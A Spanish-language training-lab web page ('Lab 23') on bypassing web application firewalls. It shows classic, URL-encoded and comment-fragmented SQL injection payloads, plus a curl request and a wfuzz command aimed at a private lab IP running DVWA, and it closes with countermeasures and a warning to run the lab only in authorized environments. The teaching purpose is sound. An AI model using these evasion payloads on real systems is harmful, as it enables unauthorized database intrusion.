<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Lab 23 – Bypass de WAF y evasión avanzada en aplicaciones web</title>

  <style>
    :root { color-scheme: dark; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #121212;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
    }
    nav {
      background-color: #1f1f1f;
      padding: 1em;
      text-align: center;
    }
    nav a {
      color: #e0e0e0;
      margin: 0 1em;
      text-decoration: none;
    }
    nav a.activo {
      font-weight: bold;
      text-decoration: underline;
    }
    h1 {
      text-align: center;
      margin-top: 1.5em;
      color: #ffffff;
    }
    .subtitulo {
      text-align: center;
      color: #bbbbbb;
      margin-bottom: 2em;
    }
    main {
      max-width: 900px;
      margin: auto;
      padding: 2em;
    }
    section {
      margin-bottom: 2em;
    }
    h2 {
      color: #90caf9;
    }
    code {
      background-color: #1e1e1e;
      padding: 0.2em 0.4em;
      border-radius: 4px;
      font-family: monospace;
    }
    pre {
      background-color: #1e1e1e;
      padding: 1em;
      border-radius: 6px;
      overflow-x: auto;
    }
    footer {
      text-align: center;
      padding: 2em;
      background-color: #1e1e1e;
      font-size: 0.9em;
      color: #aaaaaa;
    }
    @media (max-width: 600px) {
      body { font-size: 1.1em; }
      h1 { font-size: 1.8em; }
      .subtitulo { font-size: 1.1em; }
      nav a { display: block; margin: 0.5em 0; }
    }
  </style>
</head>

<body>

<nav>
  <a href="../../index.html">Inicio</a>
  <a href="../index.html" class="activo">Laboratorios</a>
  <a href="../../glosario.html">Glosario</a>
  <a href="../../simulador.html">Simulador</a>
</nav>

<h1>Lab 23 – Bypass de WAF y evasión avanzada en aplicaciones web</h1>
<p class="subtitulo">
  Manipulación de payloads para evadir firewalls de aplicaciones web y análisis de respuestas
</p>

<main>

<section>
  <h2>1. Objetivo</h2>
  <p>
    Identificar y evadir mecanismos de protección implementados por un WAF (Web Application Firewall)
    mediante técnicas de codificación, fragmentación y manipulación de payloads, comprendiendo
    cómo inspeccionan las solicitudes HTTP.
  </p>
</section>

<section>
  <h2>2. Nivel de dificultad</h2>
  <p>Avanzado</p>
</section>

<section>
  <h2>3. Herramientas utilizadas</h2>
  <ul>
    <li>Burp Suite</li>
    <li>curl</li>
    <li>Wfuzz</li>
    <li>ModSecurity (WAF)</li>
  </ul>
</section>

<section>
  <h2>4. Entorno de laboratorio</h2>
  <p>
    Kali Linux como máquina atacante, servidor web con ModSecurity activo,
    aplicación vulnerable (DVWA o similar) y red virtual controlada.
  </p>
</section>

<section>
  <h2>5. Escenario</h2>
  <p>
    Evaluar la eficacia de un WAF frente a ataques de inyección y analizar
    qué técnicas permiten evadir las reglas activas sin ser detectado.
  </p>
</section>

<section>
  <h2>6. Desarrollo</h2>

  <p>Payload clásico SQLi:</p>
  <pre><code>curl -X GET "http://192.168.1.50/vulnerable.php?id=1' OR '1'='1"</code></pre>

  <p>Payload codificado:</p>
  <pre><code>%27%20OR%20%271%27%3D%271</code></pre>

  <p>Payload fragmentado:</p>
  <pre><code>id=1%27/**/OR/**/%271%27=%271</code></pre>

  <p>Fuzzing con Wfuzz:</p>
  <pre><code>wfuzz -u "http://192.168.1.50/vulnerable.php?id=FUZZ" -w payloads.txt</code></pre>
</section>

<section>
  <h2>7. Resultados esperados</h2>
  <ul>
    <li>Bloqueo de payloads clásicos</li>
    <li>Aceptación de variantes evasivas</li>
    <li>Diferencias en códigos HTTP (403, 200)</li>
  </ul>
</section>

<section>
  <h2>8. Análisis de resultados</h2>
  <p>
    Los WAF detectan patrones estáticos. Variaciones sintácticas pueden evadir
    reglas sin alterar la lógica del ataque.
  </p>
</section>

<section>
  <h2>9. Contramedidas</h2>
  <ul>
    <li>Actualizar OWASP CRS</li>
    <li>Validación estricta del lado servidor</li>
    <li>Correlación de eventos en SIEM</li>
  </ul>
</section>

<section>
  <h2>10. Riesgos y advertencias</h2>
  <p>
    Este laboratorio debe ejecutarse únicamente en entornos controlados.
    No aplicar técnicas de evasión en sistemas reales sin autorización.
  </p>
</section>

<section>
  <h2>11. Evidencias</h2>
  <p><em>Espacio reservado para capturas de Burp, curl, Wfuzz y logs del WAF.</em></p>
</section>

<section>
  <h2>12. Validación cruzada</h2>
  <ul>
    <li>MITRE ATT&CK T1562.006</li>
    <li>OWASP ModSecurity CRS</li>
    <li>CIS Control 16</li>
    <li>NIST SP 800-95</li>
  </ul>
</section>

<section>
  <h2>13. Nivel de certificación</h2>
  <p>Avanzado – Alineado con OSWE, eWPTXv2 y Red Team Operator</p>
</section>

</main>

<footer>
  El Pergamino Digital · Laboratorio 23 · Licencia CC BY-NC-SA 4.0
</footer>

</body>
</html>
